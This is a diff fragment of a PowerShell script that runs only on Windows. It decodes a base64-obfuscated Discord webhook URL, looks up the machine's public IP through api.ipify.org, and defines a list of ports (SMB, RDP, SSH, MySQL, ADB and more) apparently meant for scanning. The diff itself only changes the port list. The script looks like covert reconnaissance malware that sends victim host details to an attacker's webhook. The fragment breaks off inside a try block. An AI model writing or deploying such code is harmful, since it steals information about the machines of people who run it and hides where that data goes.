@@ -1,20 +1,11 @@
+
 if ($IsMacOS -or $IsLinux -or $env:OSTYPE -like "*darwin*" -or $env:OSTYPE -like "*linux*") { exit }
 
 $b64_tier1 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTQ5MjU1MjgxMzQ1MDg4NzMzOC83SURPTmdpZUJUZ2dSbUU4TWJtTXJBT1dwM3cxcEdJZ1NleVFjWl90UUlSOFJaeUdMUGNxX3FCc0N4aWtzZUlPOUlSMA=="
 $w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64_tier1))
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$ports = @(
-    21,22,23,      
-    80,443,        
-    135,139,445,   
-    3306,6379,     
-    3389,5900,     
-    5555,         
-    8000,8080,8083,    
-    8123,32400,   
-    9100        
-)
+$ports = @(21,22,23,2323,53,81,80,135,139,443,445,3306,3389,5555,8080,8000,8083,8123)
 
 try {
     $ipP = try{(IWR api.ipify.org -TimeoutSec 5).Content}catch{'Unknown'}
